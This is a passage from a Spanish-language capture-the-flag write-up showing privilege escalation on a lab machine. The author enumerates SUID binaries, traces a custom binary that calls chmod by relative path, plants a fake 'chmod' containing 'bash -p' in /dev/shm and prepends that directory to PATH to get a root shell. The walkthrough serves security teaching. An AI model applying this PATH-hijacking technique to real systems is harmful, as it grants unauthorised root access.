[sudo] password for dexter: 
dexter@laboratory:~$ cd /
dexter@laboratory:/$
dexter@laboratory:/$ find \-perm -4000 2>/dev/null | grep -v snap
./usr/local/bin/docker-security
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/su
./usr/bin/gpasswd
./usr/bin/fusermount
./usr/bin/chfn
./usr/bin/pkexec
./usr/bin/at
./usr/bin/umount
./usr/bin/chsh
./usr/bin/mount
./usr/bin/passwd
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
dexter@laboratory:/$
```

Vemos permisos SUID en `pkexec`; sin embargo, vamos a resolver la máquina como fue pensada. Tenemos el binario con permisos SUID `/usr/local/bin/docker-security`, si lo ejecutamos no vemos nada; por lo tanto, vamos a ejecutarlo utilizando el comando `ltrace`:

```bash
dexter@laboratory:/$ /usr/local/bin/docker-security
dexter@laboratory:/$ ltrace /usr/local/bin/docker-security
setuid(0)                                                                      = -1
setgid(0)                                                                      = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                         = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                         = 256
+++ exited (status 0) +++
dexter@laboratory:/$
```

Aqui ya debemos ver algo interesante y es que el comando `chmod` está siendo declarado de forma relativa y como absoluta; por lo tanto podemos hacer un **Path Hijacking** creando un nuevo archivo bajo del directorio que queramos, siempre y cuando tengamos permisos; por ejemplo `/de/shm`:

```bash
dexter@laboratory:/$ cd /dev/shm/
dexter@laboratory:/dev/shm$ touch chmod
dexter@laboratory:/dev/shm$ vi chmod
dexter@laboratory:/dev/shm$ cat chmod
bash -p
dexter@laboratory:/dev/shm$ chmod +x chmod
dexter@laboratory:/dev/shm$ ls -l
total 4
-rwxr-xr-x 1 dexter dexter 8 Mar 22 04:17 chmod
dexter@laboratory:/dev/shm$
```

Ahora cambiamos el valor de la variable `PATH` para que se incluya primero la ruta de nuestro archivo:

```bash
dexter@laboratory:/dev/shm$ export PATH=/dev/shm:$PATH
dexter@laboratory:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:/dev/shm$
```

Y ahora ejecutamos el binario del cual tenemos permisos SUID:

```bash
dexter@laboratory:/dev/shm$ /usr/local/bin/docker-security
root@laboratory:/dev/shm# whoami
root
root@laboratory:/dev/shm#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
